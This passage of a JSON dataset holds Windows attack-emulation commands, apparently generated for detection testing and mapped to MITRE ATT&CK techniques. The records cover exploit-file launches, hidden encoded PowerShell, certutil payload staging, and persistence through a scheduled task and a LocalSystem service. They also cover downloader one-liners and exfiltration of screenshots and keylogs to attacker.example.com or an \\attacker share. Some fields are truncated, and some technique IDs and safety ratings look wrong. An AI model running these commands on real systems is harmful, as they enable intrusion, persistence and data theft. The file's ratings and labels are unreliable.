      "command": "rundll32.exe \"%TEMP%\\malicious.hwp\",OpenDocument",
      "description": "Launches a malicious HWP file using rundll32.exe, triggering CVE-2017-8291 exploitation when the file is parsed.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a rundll32 process that loads the HWP file; if the vulnerable parser is present, malicious code execution occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:50.180586",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ca0a70be-79a7-40e1-bd27-051e5729eaa1",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c start \"\" \"%TEMP%\\exploit.eps\"",
      "description": "Uses the built\u2011in start command to open an EPS file that contains a crafted payload exploiting CVE-2017-8291.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new process associated with the default EPS viewer is launched; the vulnerable viewer executes the embedded exploit.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:50.180586",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "48cc8a24-7ad2-40c2-b670-49fc98f15493",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$b='This is a benign EPS placeholder'; Set-Content -Path \\\"$env:TEMP\\exploit.eps\\\" -Value $b -Encoding ASCII; mshta.exe \\\"$env:TEMP\\exploit.eps\\\"\"",
      "description": "Creates a dummy EPS file in %TEMP% via PowerShell and then launches it with mshta.exe, emulating the client\u2011execution exploit chain.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell writes a harmless EPS placeholder to disk, then mshta.exe opens the file; in a vulnerable environment the file would trigger CVE\u20112017\u20118291 execution.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:50.181667",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "032715f4-d1c1-4c90-b3ce-f5b566e0e8a7",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Write-Output 'Test execution'\"",
      "description": "Basic PowerShell execution using the typical attacker flags that hide the window, suppress the logo, run non\u2011interactive and bypass the execution policy.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A hidden PowerShell process writes the string \"Test execution\" to the console (which is not visible because the window is hidden).",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:51.591476",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dac0bb21-c094-4a85-a142-4a3687a86f2b",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand \"R2V0LVNlcnZpY2UgfCBX...\"",
      "description": "Intermediate example using an encoded PowerShell command. The Base64 string is generated from the UTF\u201116LE representation of: Get-Service | Where-Object {$_.Status -eq 'Running'}. The same stealth flags are applied.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A hidden PowerShell process decodes the command and outputs a list of services whose status is \"Running\". No visible window appears.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:51.591476",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a357b46f-adfb-4081-80ce-b71dc79435e5",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode \"%TEMP%\\payload.b64\" \"%TEMP%\\script.ps1\" -ErrorAction SilentlyContinue; powershell -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%TEMP%\\script.ps1\"; Remove-Item \"%TEMP%\\script.ps1\" -ErrorAction SilentlyContinue",
      "description": "Advanced scenario that mimics an attacker dropping a Base64\u2011encoded PowerShell script via a legacy binary (certutil), then executing it with the full set of stealth flags, and finally cleaning up the script file.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "certutil decodes the benign Base64 payload into a temporary script file, PowerShell runs the script in a hidden, non\u2011interactive window, and the script file is removed afterwards. No console windows are shown.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:51.591476",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "760820fc-89be-4825-b7f5-6f9d4f4a8002",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"New-Item -Path $env:TEMP\\persist.txt -ItemType File -Force -Value 'persistence test'\"",
      "description": "Creates a benign file in the TEMP directory using PowerShell. The file acts as a simple persistence marker and demonstrates basic PowerShell execution without requiring elevated rights.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named persist.txt containing the text \"persistence test\" is written to the user's %TEMP% folder.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:55.558433",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "56e1de78-454e-456f-8f7c-5f2055e95e01",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /SC ONLOGON /RL HIGHEST /TN \"PersistTask\" /TR \"powershell -NoProfile -WindowStyle Hidden -EncodedCommand VABlAHcAbgAtAEkAdABlAG0AIABBAHAAZQByAGUAbgB0ACAAJABlAG4AdgA6AFQARQBNAFAAXABwAGUAcwBwAGUAcgB0AC4AdAB4AHQAIABBAHAAZQByAGUAbgB0ACAARgBpAGwAZQAgAEYAbwByAGMAZQAgAFYAYQBsAHUAZQAgACcAcABlAHIAcwBzAGkAcwB0AGUAbgBjAGUAIAB0AGUAcwB0ACcA\" /F",
      "description": "Registers a scheduled task that runs a PowerShell script (encoded in Base64) at every user logon. The script creates the same persistence marker file as the basic example. Uses schtasks.exe (legacy binary) and requires administrative rights to create a task with highest run level.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named \"PersistTask\" is created. When any user logs on, the task launches PowerShell which writes persist.txt to %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:55.558433",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "54c557f8-15cc-413e-b7e3-df16b5ab0fe8",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create PersistSvc binPath= \"powershell -NoProfile -WindowStyle Hidden -EncodedCommand VABlAHcAbgAtAEkAdABlAG0AIABBAHAAZQByAGUAbgB0ACAAJABlAG4AdgA6AFQARQBNAFAAXABwAGUAcwBwAGUAcgB0AC4AdAB4AHQAIABBAHAAZQByAGUAbgB0ACAARgBpAGwAZQAgAEYAbwByAGMAZQAgAFYAYQBsAHUAZQAgACcAcABlAHIAcwBzAGkAcwB0AGUAbgBjAGUAIAB0AGUAcwB0ACcA\" start= auto obj= \"LocalSystem\"",
      "description": "Creates a new Windows service named \"PersistSvc\" that runs a PowerShell command (Base64\u2011encoded) to write the persistence marker file. The service is set to start automatically and runs under the LocalSystem account, demonstrating a higher\u2011privilege persistence technique.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A service called \"PersistSvc\" is installed. On system boot or when manually started, the service launches PowerShell which creates persist.txt in %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:55.558433",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2856ccb7-6213-4db3-a8b0-3cc72d09d145",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"Write-Host 'Hello, world!'\"",
      "description": "Basic execution of a PowerShell command that prints a benign message to the console. Demonstrates a simple PowerShell process launch that can be detected by monitoring PowerShell execution flags.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A PowerShell process starts, writes 'Hello, world!' to the console, and exits without modifying the system.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:57.178997",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cc4ae7ea-ec9b-4ae9-b0f3-0325c7036a05",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"Get-Process | Where-Object { $_.Name -like '*powershell*' }\"",
      "description": "Intermediate example that enumerates running processes and filters for any PowerShell instances. Shows use of pipeline and script block, which are common in malicious PowerShell usage.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A PowerShell process starts, lists all processes, filters for those whose name contains \"powershell\", and outputs the matching entries to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:57.178997",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6e786ac4-8f79-4384-992c-a9221ab4cb5c",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUAcwAgAC0gQ29tbWFuZCAnU2V0LUNvbnRlbnQgJAB0ZW1wXG5ld19maWxlLnR4dCAnVGVzdCBjb250ZW50Jyc='\"",
      "description": "Advanced scenario where PowerShell is launched from a cmd.exe shell (common detection vector). The PowerShell command is Base64\u2011encoded (UTF\u201116LE) and writes a harmless text file to %TEMP% using Set-Content. Demonstrates encoded command usage and cross\u2011process launch.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "cmd.exe starts, invokes PowerShell with an encoded command. PowerShell decodes the command, creates a file %TEMP%\\new_file.txt containing the string \"Test content\", then exits. No privileged actions are taken.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:57.178997",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bc027442-3394-4306-b41a-0c717a525ad5",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo TestMessage > \\\\.\\pipe\\SharedMemPipe\"",
      "description": "Creates a named pipe (SharedMemPipe) and writes a benign test string to it using cmd.exe, simulating shared memory usage for remote control commands.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A named pipe \\.\\",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:58.408168",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0d81c2b3-b42b-4af3-88aa-1c66514171a6",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo DummyContent > %TEMP%\\dummy.txt && type %TEMP%\\dummy.txt > \\\\.\\pipe\\SharedMemPipe\"",
      "description": "Writes a temporary file, then pipes its contents to a named pipe via cmd.exe, demonstrating indirect shared\u2011memory usage.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file %TEMP%\\dummy.txt is created, its contents are read, and the same data is sent to the pipe \\.\\",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:58.409246",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "63871c76-7c40-4018-9b32-3ce78b6e1cf0",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -Command \"$pipe = New-Object System.IO.Pipes.NamedPipeServerStream 'AdvancedPipe', [System.IO.Pipes.PipeDirection]::InOut, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::None; $pipe.WaitForConnection(); $sr = New-Object System.IO.StreamReader $pipe; $line = $sr.ReadLine(); Write-Host \\\"Received: $line\\\"; $pipe.Dispose();\" && cmd.exe /c \"echo AdvancedMessage > \\\\.\\pipe\\AdvancedPipe\"",
      "description": "Starts a PowerShell\u2011based named pipe server (AdvancedPipe) that waits for a connection, then uses cmd.exe to write a message into the pipe, showing coordinated use of PowerShell and cmd.exe for shared memory communication.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell creates and listens on \\.\\",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:58.409246",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2798914b-8ecf-402c-adfe-9350b42085ad",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Trojan",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Executing malicious hash 7bab405fbc6af65680443ae95c30595d\"",
      "description": "Basic demonstration using cmd.exe to output a string containing the known malicious hash. This simulates a process whose command line includes the hash, allowing detection rules to trigger.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Writes the text 'Executing malicious hash 7bab405fbc6af65680443ae95c30595d' to the console and exits.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:00.649773",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a284424e-a119-40bc-b7d4-956765634b6e",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Trojan",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process notepad.exe -ArgumentList '7bab405fbc6af65680443ae95c30595d'\"",
      "description": "Intermediate example launching a legitimate binary (notepad.exe) with the malicious hash passed as an argument. The process creation should be observable by detection mechanisms that inspect command\u2011line arguments.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Opens Notepad with the argument string; Notepad will ignore the argument but the process will appear in the system with the full command line containing the hash.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:00.649773",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a1ce331a-fea9-43c3-b8fe-326fd2fd38fb",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Trojan",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo V2FpdCBmb3IgaGFzaCA3YmFiNDA1ZmJjNmFmNjU2ODA0NDNhZTk1YzMwNTk1ZCA= > %TEMP%\\hash.b64 && certutil -decode %TEMP%\\hash.b64 %TEMP%\\hash.txt -ErrorAction SilentlyContinue && type %TEMP%\\hash.txt\"",
      "description": "Advanced scenario using built\u2011in certutil to decode a Base64\u2011encoded string that contains the malicious hash, then display it. This mimics an attacker staging data via encoded payloads before execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a temporary Base64 file, decodes it to a text file containing the hash, and prints the hash to the console. No real payload is executed.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:00.649773",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "98aa568f-9b74-4794-a4b5-54e4fdf3ef13",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Downloader",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f \"http://example.com/file.exe\" \"%TEMP%\\file.exe\"",
      "description": "Uses the built\u2011in certutil utility to download a file from a remote HTTP server into the temporary directory. The -f flag overwrites any existing file with the same name.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named file.exe is created in %TEMP% containing the content fetched from http://example.com/file.exe.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:02.011177",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f2a5bdbf-968a-48bb-8a81-cddfff4d9fe5",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Downloader",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer myDownload /download /priority normal \"http://example.com/file2.exe\" \"%TEMP%\\file2.exe\"",
      "description": "Leverages the legacy BITS (Background Intelligent Transfer Service) client to pull a remote executable into %TEMP%. This mimics typical downloader activity without requiring PowerShell.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "BITS creates a job named myDownload, downloads file2.exe from the URL, and stores it as %TEMP%\\file2.exe.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:02.011177",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4ee5489c-b04e-4d2e-a9de-e942c97d8782",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Downloader",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$url='http://example.com/file3.exe'; $out='%TEMP%\\\\file3.exe'; (New-Object System.Net.WebClient).DownloadFile($url,$out); Remove-Item $out -ErrorAction SilentlyContinue\"",
      "description": "Executes a PowerShell one\u2011liner that downloads a file via .NET's WebClient class and then attempts to delete it (silently ignoring errors). Demonstrates a PowerShell\u2011based downloader pattern.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The file file3.exe is fetched from the remote URL and written to %TEMP%\\file3.exe; afterwards the script tries to delete the file, suppressing any errors if the deletion fails.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:02.011177",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a57d50a9-7812-4ca2-bf01-3db68419b502",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode \"%TEMP%\\sample.txt\" \"%TEMP%\\sample.b64\"",
      "description": "Encodes a plaintext file (sample.txt) to a Base64\u2011encoded file (sample.b64) using the built\u2011in certutil utility. This mimics the common data\u2011encoding technique used for evasion.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates %TEMP%\\sample.b64 containing the Base64 representation of the original file. No changes are made to the system beyond the new file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:04.645039",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "40b21286-78d1-4d6b-b07a-1cc488ad5664",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"VwByaXRlLU91dHB1dCAiRW5jb2RlZCBUZXN0IiA=\"",
      "description": "Runs a PowerShell command via a Base64\u2011encoded string (UTF\u201116LE). The decoded command is: Write-Output \"Encoded Test\". Demonstrates the use of the -EncodedCommand flag for data encoding.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "PowerShell decodes the Base64 payload and prints the text \"Encoded Test\" to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:04.645039",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e9c14b09-58c6-4499-b79a-154469d7db09",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"echo aGVsbG8gd29ybGQ= | certutil -decode -f - \\\"%TEMP%\\\\decoded.txt\\\" && type \\\"%TEMP%\\\\decoded.txt\\\"\"",
      "description": "Echoes a Base64 string (aGVsbG8gd29ybGQ= which decodes to \"hello world\"), pipes it to certutil for decoding, writes the result to a temporary file, and then displays the file content. Shows a classic cmd.exe + certutil data\u2011encoding workflow.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates %TEMP%\\decoded.txt containing the text \"hello world\" and outputs that text to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:04.645039",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e5b24e0c-0bd3-4c29-ba3d-f4231baea7a7",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode \"%TEMP%\\data.txt\" \"%TEMP%\\data.b64\"",
      "description": "Encodes the contents of a plain\u2011text file (data.txt) to Base64 using the built\u2011in certutil utility and writes the result to data.b64. This mimics the Data Encoding technique before exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "certutil reads data.txt, converts the binary data to a Base64 representation, and creates data.b64 containing the encoded text.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:05.659896",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "adda2b34-a907-4460-a566-f2187b5c1382",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"JABiAHkAdABlAHMAIAAgAD0AIABbSU8uRmlsZV0AOgA6AFJlYWRBbGxCeXRlcygAIgAlVEFNUCAlXFxkYXRhLnR4dCIpADsAIABbSU8uRmlsZV0AOgA6AFdyaXRlQWxsVGV4dCgAIgAlVEFNUCAlXFxkYXRhLmI2NDAiLCAoAFsAQwBvbnZlcnRdADoAOgBUb0Jhc2U2NFN0cmluZygAJABieXRlcykpADsA\"",
      "description": "Runs a PowerShell script that reads %TEMP%\\data.txt, converts its bytes to a Base64 string, and writes the string to %TEMP%\\data.b64. The script is supplied as a Base64\u2011encoded UTF\u201116LE string via the -EncodedCommand switch, matching the typical PowerShell encoded\u2011command usage.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell decodes the Base64 argument, executes the script, and creates a file named data.b64 containing the Base64 representation of the original file's contents.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:05.659896",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e6f068dc-a469-460a-8862-af90a4412f3a",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "for %F in (\"%TEMP%\\*.txt\") do certutil -encode \"%F\" \"%F.b64\"",
      "description": "Iterates over all .txt files in the %TEMP% directory and encodes each one to Base64 using certutil, storing the result in a sibling .b64 file. Demonstrates batch\u2011script based data encoding for multiple artifacts.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The loop calls certutil for each matching file; each original .txt file is read, Base64\u2011encoded, and the output is written to a new file with the same name plus a .b64 extension.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:05.659896",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "886604ff-e9ed-41bb-863b-e426ee6ea2e4",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Download Malware-Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://example.com/malicious.jpg %TEMP%\\malware.jpg",
      "description": "Uses the built\u2011in certutil utility to download a JPEG file from a remote URL and save it to the temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named malware.jpg is written to %TEMP% containing the downloaded content.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:06.473959",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9291dfd7-254d-4643-be21-51879aead867",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Download Malware-Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer mydownload /download /priority normal http://example.com/malicious.jpg %TEMP%\\malware.jpg",
      "description": "Leverages bitsadmin (Background Intelligent Transfer Service) to fetch the JPEG file and store it in the temporary folder.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The JPEG is downloaded to %TEMP%\\malware.jpg using BITS; no elevation is required.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:06.475066",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "88c5044d-ddf7-40d7-94a5-ada9d7de69e9",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Download Malware-Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$url='http://example.com/malicious.jpg'; $out=\\\"$env:TEMP\\\\malware.jpg\\\"; Invoke-WebRequest -Uri $url -OutFile $out\"",
      "description": "Executes a PowerShell one\u2011liner that downloads the JPEG via Invoke-WebRequest and writes it to the temp directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The script contacts the URL, retrieves the JPEG, and saves it as %TEMP%\\malware.jpg.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:06.475066",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c4ab066c-19f1-4e50-8eb8-af6cbbaaf44a",
      "ttp_id": "unknown",
      "technique_id": "T1020",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode \"%TEMP%\\keylog.txt\" \"%TEMP%\\keylog.b64\" && copy \"%TEMP%\\keylog.b64\" \"\\\\attacker\\share\\keylog.b64\"",
      "description": "Encodes a dummy keylog file to Base64 using certutil and copies the encoded file to a remote UNC share, simulating exfiltration of captured keystroke data.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates keylog.txt (if not present, certutil will error but continue), generates keylog.b64, and copies it to the attacker share. No destructive actions are performed.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:08.295692",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ff22237b-097d-4276-97e9-3a0cb1761415",
      "ttp_id": "unknown",
      "technique_id": "T1020",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer exfilJob /upload \"http://attacker.example.com/upload\" \"%TEMP%\\screenshot.png\"",
      "description": "Uses bitsadmin to upload a placeholder screenshot file from the TEMP directory to a remote HTTP endpoint, representing exfiltration of screenshot data via a built\u2011in Windows utility.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to upload %TEMP%\\screenshot.png to the specified URL. In a test environment the file can be a harmless image; no actual network traffic is required for detection testing.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:08.295692",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2c44ebd7-ff3c-4403-9bc0-a752e40d7f19",
      "ttp_id": "unknown",
      "technique_id": "T1020",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,$null,$null,[System.Drawing.Size]::Empty); $path = \\\"$env:TEMP\\\\screenshot.png\\\"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png); $bmp.Dispose(); $graphics.Dispose(); certutil -encode $path $path.b64; copy $path.b64 \\\\\\\\attacker\\\\share\\\\screenshot.b64\"",
      "description": "PowerShell script captures the primary screen to a PNG file, encodes the image with certutil, and copies the Base64 file to a remote UNC share, demonstrating a full pipeline of screenshot capture and exfiltration using only built\u2011in Windows components.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Creates a screenshot.png in the TEMP folder, encodes it to screenshot.png.b64, and copies the encoded file to the attacker share. The command runs entirely with user privileges; no destructive changes are made, but it accesses the screen buffer, which may be considered higher risk in a production environment.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:08.295692",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bb6383d0-6da7-4d67-9acd-5b1991acf82a",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Remote Access Tools",
      "tactic": "execution",
      "platform": "windows",
